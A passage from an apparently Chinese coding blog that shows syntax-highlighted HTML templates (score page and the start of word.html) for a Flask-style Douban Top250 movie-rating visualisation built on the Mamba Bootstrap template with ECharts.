class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>descriptison<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>keywords<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Favicons --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/img/favicon.png<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/img/apple-touch-icon.png<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>apple-touch-icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Google Fonts --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,600,600i,700,700i,900<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Vendor CSS Files --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/bootstrap/css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/icofont/icofont.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/boxicons/css/boxicons.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/animate.css/animate.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/venobox/venobox.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/aos/aos.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Template Main CSS File --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/css/style.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- =======================================================  * Template Name: Mamba - v2.0.1  * Template URL: https://bootstrapmade.com/mamba-one-page-bootstrap-template-free/  * Author: BootstrapMade.com  * License: https://bootstrapmade.com/license/  ======================================================== --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- ======= Header ======= --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo float-left<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text-light<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>Mamba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!-- Uncomment below if you prefer to use an image logo --></span>        <span class="token comment">&lt;!-- &lt;a href="index.html">&lt;img src="static/assets/img/logo.png" alt="" class="img-fluid">&lt;/a>--></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-menu float-right d-none d-lg-block<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>active<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/index<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Home<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/movie<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>movie<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/score<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>rating<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/word<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>wordcloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/team<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Team<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- .nav-menu --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Header --></span><span class="token comment">&lt;!-- ======= Our Team Section ======= --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>team<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>team<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>section-title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>豆瓣电影Top250评分分布<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>         <span class="token comment">&lt;!-- ======= Counts Section ======= --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>counts section-bg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!-- 为 ECharts 准备一个具备大小（宽高）的 DOM --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>main<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span>300px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Counts Section --></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Our Team Section --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> dom <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> myChart <span class="token operator">=</span> echarts<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>dom<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>option <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>option <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    color<span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">'#3398DB'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    tooltip<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        trigger<span class="token operator">:</span> <span class="token string">'axis'</span><span class="token punctuation">,</span>        axisPointer<span class="token operator">:</span> <span class="token punctuation">&#123;</span>            type<span class="token operator">:</span> <span class="token string">'shadow'</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    grid<span class="token operator">:</span><span class="token punctuation">&#123;</span>        left<span class="token operator">:</span><span class="token string">'3%'</span><span class="token punctuation">,</span>        right<span class="token operator">:</span><span class="token string">'4%'</span><span class="token punctuation">,</span>        bottom<span class="token operator">:</span><span class="token string">'3%'</span><span class="token punctuation">,</span>        containLabel<span class="token operator">:</span><span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    xAxis<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        type<span class="token operator">:</span> <span class="token string">'category'</span><span class="token punctuation">,</span>        data<span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> score <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    yAxis<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        type<span class="token operator">:</span> <span class="token string">'value'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    series<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>        data<span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> num <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        type<span class="token operator">:</span> <span class="token string">'bar'</span><span class="token punctuation">,</span>        barWidth<span class="token operator">:</span><span class="token string">'60%'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>option <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> option <span class="token operator">===</span> <span class="token string">"object"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    myChart<span class="token punctuation">.</span><span class="token function">setOption</span><span class="token punctuation">(</span>option<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>       </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- ======= Footer ======= --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>footer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>copyright<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token entity named-entity" title="&copy;">&amp;copy;</span> Copyright <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>Mamba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span>. All Rights Reserved      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>credits<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!-- All the links in the footer should remain intact. --></span>        <span class="token comment">&lt;!-- You can delete the links only if you purchased the pro version. --></span>        <span class="token comment">&lt;!-- Licensing information: https://bootstrapmade.com/license/ --></span>        <span class="token comment">&lt;!-- Purchase the pro version with working PHP/AJAX contact form: https://bootstrapmade.com/mamba-one-page-bootstrap-template-free/ --></span>        Designed by <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://bootstrapmade.com/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>BootstrapMade<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Footer --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>back-to-top<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icofont-simple-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Vendor JS Files --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/bootstrap/js/bootstrap.bundle.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery.easing/jquery.easing.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/php-email-form/validate.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery-sticky/jquery.sticky.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/venobox/venobox.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/waypoints/jquery.waypoints.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/counterup/counterup.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/isotope-layout/isotope.pkgd.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/aos/aos.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Template Main JS File --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/js/main.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="word-html"><a href="#word-html" class="headerlink" title="word.html"></a>word.html</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Mamba Bootstrap Template - Index<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token 